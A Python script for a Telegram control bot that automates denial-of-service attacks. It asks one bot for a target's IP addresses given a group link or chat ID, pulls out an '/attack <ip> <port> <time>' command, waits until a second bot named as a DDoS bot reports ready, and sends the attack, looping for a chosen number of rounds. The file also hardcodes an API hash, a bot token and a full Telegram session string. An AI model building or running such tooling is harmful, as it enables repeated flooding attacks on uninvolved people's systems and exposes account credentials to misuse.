import asyncio
import re
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

API_ID = 36295148
API_HASH = "bee66be844e3be0e314508e92a7c4e7d"
BOT_TOKEN = "8473172869:AAG1B8DvV4dwodGudTz11cBed2iq-DDReSY"

BOT_A = "@botbysahilbot"          # IP BOT
BOT_B = "@DDOS_Aditya_xd_bot"     # Attack BOT

STRING_SESSION = (
    "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qUIIMziiQPAG5irsAx37"
    "rfUZra0WJqTRjSox2F7NSUqUi9_bSizm3sfw3Ez5GszsCnrgY7IVixINZgjWQobFkg4JmOePZb14z6XN"
    "O1e1oqNQ_oxugaQN0cBB3IWaH0BaY4G8-O4IfF3GsY_QIbFlLdJeLCxIA6Tah1SHTrTdK4reg_9Vig2sn"
    "pHSri02cNdkoawDBk1QUyo3mL6r4v7uuO0b5w7LpwjCmJnvYUaWOH0uy14seFuaU4gSnQNvvz79sK_p8v"
    "QoZm6h2HLUIOwZLZRugWZ-_iRiaYiU="
)

tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)

# state
chat_targets: dict[int, str] = {}
chat_counts: dict[int, int] = {}
loop_tasks: dict[int, asyncio.Task] = {}
ip_waiters: dict[int, asyncio.Future] = {}
bot_b_status = "UNKNOWN"


# ---------- LISTENERS ----------
@tele.on(events.NewMessage(from_users=BOT_A))
async def ip_bot_listener(event):
    """
    IP BOT ka reply listen karo, CMD line clean karke pending chats ko do.
    """
    text = event.text or ""
    print("📩 IP BOT REPLY:", repr(text))

    # 1) 'CMD:' wali line nikaalo
    # Example: "CMD: /attack 91.108.17.54 32003 30"
    m_line = re.search(r"CMD:s*(.+)", text)
    if not m_line:
        return

    line = m_line.group(1).strip()

    # 2) Backticks ke andar ka part, agar ho to
    m_cmd = re.search(r"`([^`]+)`", line)
    if m_cmd:
        raw_cmd = m_cmd.group(1).strip()
    else:
        raw_cmd = line.lstrip("* ").strip()

    # 3) Sirf /attack <ip> <port> <time> command nikaalo
    m_attack = re.search(r"(/attacks+S+s+S+s+S+)", raw_cmd)
    if m_attack:
        final_cmd = m_attack.group(1).strip()
    else:
        final_cmd = raw_cmd

    print("✅ FINAL CMD:", final_cmd)

    for chat_id, fut in list(ip_waiters.items()):
        if not fut.done():
            fut.set_result(final_cmd)
        ip_waiters.pop(chat_id, None)


@tele.on(events.NewMessage(from_users=BOT_B))
async def bot_b_listener(event):
    """
    DDOS BOT ke /status / attack / cooldown messages se status set karo.
    """
    global bot_b_status
    text = event.text or ""
    low = text.lower()
    print("DDOS BOT MSG:", repr(text))

    # READY patterns (unicode + plain text)
    if (
        "✅ **ʀᴇᴀᴅʏ**" in text
        or "no attack running" in low
        or "you can start a new attack" in low
    ):
        bot_b_status = "READY"

    # RUNNING patterns
    elif (
        "attack started" in low
        or "ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ" in text
        or "attack running" in low
        or "ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ" in text
    ):
        bot_b_status = "RUNNING"

    # COOLDOWN patterns
    elif "cooldown" in low or "⏳" in text:
        bot_b_status = "COOLDOWN"

    else:
        bot_b_status = "UNKNOWN"


# ---------- CORE LOOP ----------
async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    global bot_b_status

    target = chat_targets.get(chat_id)
    if not target:
        await context.bot.send_message(chat_id, "❌ Target not set, use /setlinkchatid first.")
        return

    count = chat_counts.get(chat_id, 1)

    await context.bot.send_message(
        chat_id,
        f'''🔁 Loop configured.
Target: `{target}`
Rounds: {count}''',
        parse_mode="Markdown",
    )

    for i in range(count):
        await context.bot.send_message(
            chat_id,
            f'''➡️ Round {i + 1}/{count}:
Sending `.getip all {target}` to IP BOT…''',
            parse_mode="Markdown",
        )

        loop = asyncio.get_running_loop()
        fut = loop.create_future()
        ip_waiters[chat_id] = fut

        await tele.send_message(BOT_A, f".getip all {target}")

        try:
            final_cmd = await asyncio.wait_for(fut, timeout=60)
        except asyncio.TimeoutError:
            await context.bot.send_message(
                chat_id,
                "⏱️ Timeout: No CMD from IP BOT, skipping this round…"
            )
            ip_waiters.pop(chat_id, None)
            continue

        await context.bot.send_message(
            chat_id,
            f'''📥 IP BOT CMD received:
`{final_cmd}`''',
            parse_mode="Markdown",
        )

        await context.bot.send_message(
            chat_id,
            "🔎 Checking BOT_B `/status` until READY…"
        )

        # Har round se pehle status reset
        bot_b_status = "UNKNOWN"

        while True:
            await tele.send_message(BOT_B, "/status")
            await asyncio.sleep(2)
            print("DEBUG status:", bot_b_status)  # debug line

            if bot_b_status == "READY":
                break

            await context.bot.send_message(
                chat_id,
                f"⏸ BOT_B status: {bot_b_status} (waiting 5s…)"
            )
            await asyncio.sleep(5)

        await tele.send_message(BOT_B, final_cmd)
        await context.bot.send_message(
            chat_id,
            f'''🚀 Sent to BOT_B:
`{final_cmd}`''',
            parse_mode="Markdown",
        )
        await asyncio.sleep(3)

    await context.bot.send_message(chat_id, "✅ All rounds finished.")
    loop_tasks.pop(chat_id, None)


# ---------- PTB COMMANDS ----------
async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /setlinkchatid <group_link_or_chatid>")
        return
    chat_targets[update.effective_chat.id] = " ".join(context.args)
    await update.message.reply_text("✅ Link / ChatID saved")


async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /setcount <number_of_attacks>")
        return
    n = max(1, int(context.args[0]))
    chat_counts[update.effective_chat.id] = n
    await update.message.reply_text(f"✅ Count set to {n}")


async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    if cid in loop_tasks:
        await update.message.reply_text("⚠️ Loop already running")
        return
    task = asyncio.create_task(telethon_loop(cid, context))
    loop_tasks[cid] = task
    await update.message.reply_text("🔁 Loop started")


async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    task = loop_tasks.pop(cid, None)
    if task:
        task.cancel()
        await update.message.reply_text("🛑 Loop stopped")
    else:
        await update.message.reply_text("No active loop running")


# ---------- MAIN ----------
async def main():
    await tele.start()
    print("🧵 Telethon connected")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("setlinkchatid", setlink))
    app.add_handler(CommandHandler("setcount", setcount))
    app.add_handler(CommandHandler("startloop", startloop))
    app.add_handler(CommandHandler("stoploop", stoploop))

    print("🤖 Control bot running")
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    await tele.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())